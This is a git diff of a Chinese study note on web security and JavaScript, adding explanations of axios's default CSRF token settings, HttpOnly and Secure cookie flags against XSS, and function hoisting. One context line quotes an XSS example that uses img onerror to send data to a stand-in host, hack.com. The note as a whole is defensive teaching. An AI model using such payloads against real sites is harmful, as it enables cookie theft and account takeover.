@@ -928,6 +928,25 @@ CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请
 
 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。
 
+
+----------
+
+
+**使用axios防止 CSRF**
+
+
+原理:
+axios默认在Request Config里已经设置了
+```javascript
+ //  ``xsrfCookieName`是用作xsrf标记值的cookie的名称
+  xsrfCookieName ：' XSRF-TOKEN '，//  默认  
+ 
+  //  ``xsrfHeaderName`是携带xsrf标记值的http标头的名称
+  xsrfHeaderName ：' X-XSRF-TOKEN '，//  默认  
+```
+
+
+
 ### XSS
 [网页链接](https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651553616&idx=1&sn=17036b87c39e81cbcb8df5d9fb1f906d&chksm=8025a891b75221874054f9f71d40a94973b583e7a444c868c8f94fa76e1c9d8b3c29d68ee6a8&scene=0#rd)
 
@@ -975,6 +994,23 @@ https://www.toutiao.com/search?item=<img onerror="new Image().src='//hack.com?c=
 从XSS工作的原理可知，在服务端进行编码，在模板解码这个过程对于富文本的内容来说，完全可以被浏览器解析到并执行，进而给了XSS执行的可乘之机。
 
 为了杜绝悲剧发生，我们需要在浏览器解析之后进行解码，得到的文本进行DOM parse拿到DOM Tree，对所有的不安全因素进行过滤，最后将内容交给浏览器，达到避免XSS感染的效果。
+
+
+----------
+
+
+**Cookies如何防范XSS攻击?**
+
+为了减轻这些攻击，需要在HTTP头部配置set-cookie:
+* HttpOnly - 这个属性可以防止cross-site scripting，因为它会禁止Javascript脚本访问cookie。
+* secure - 这个属性告诉浏览器仅在请求为HTTPS时发送cookie。
+
+结果应该是这样的: Set-Cookie: sid=; HttpOnly. **使用Express的话，cookie-session默认配置好了**。
+
+>在cookie-session中httpOnly: a boolean indicating whether the cookie is only to be sent over HTTP(S), and not made available to client JavaScript (true by default).
+
+
+>一个布尔值，指示cookie是否仅通过HTTP（S）发送，并且不提供给客户端JavaScript（true默认情况下）
 
 
 ## 渲染机制类
@@ -1159,7 +1195,7 @@ test();
 
 这段代码的执行结果是undefined 和 2。
 
-
+**变量和函数都被提升(hoisted) 到了函数体的顶部**
 上面的代码等同于下面的代码：
 ```
 function test() {
